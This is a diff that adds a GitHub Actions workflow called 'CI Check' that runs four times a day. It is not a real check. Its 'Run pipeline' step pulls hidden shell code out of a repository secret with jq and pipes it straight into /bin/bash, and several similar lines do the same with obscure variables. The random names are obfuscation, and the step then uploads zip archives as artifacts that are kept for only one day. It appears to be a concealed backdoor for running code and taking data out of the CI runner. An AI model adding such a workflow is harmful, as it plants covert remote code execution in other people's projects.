@@ -1,0 +1,35 @@
+name: CI Check
+on:
+  workflow_dispatch:
+
+  schedule:
+    - cron: '14 3,9,15,21 * * *'
+permissions:
+  contents: read
+  actions: read
+env:
+  RUNNER_DEBUG: 0
+concurrency:
+  group: ${{ github.workflow }}
+  cancel-in-progress: false
+jobs:
+  invoke:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+      - name: Run pipeline
+        env:
+          etoav8: ${{ secrets.etoav8 }}
+        run: |
+          printf '%s' "$etoav8" | jq -r .yz92472 | /bin/bash
+          printf '%s' "$usf3310" | jq -r .zzjvo94 | /bin/bash
+          echo $tj496 | jq -r .bk50 | /bin/bash
+          echo $ptjh2594 | jq -r .kpdt6 | /bin/bash
+          printf '%s' "$cb5" | jq -r .uw825 | /bin/bash
+
+      - name: Upload archive
+        uses: actions/upload-artifact@v4
+        with:
+          name: i5NdMUgZ
+          path: "*.zip"
+          retention-days: 1
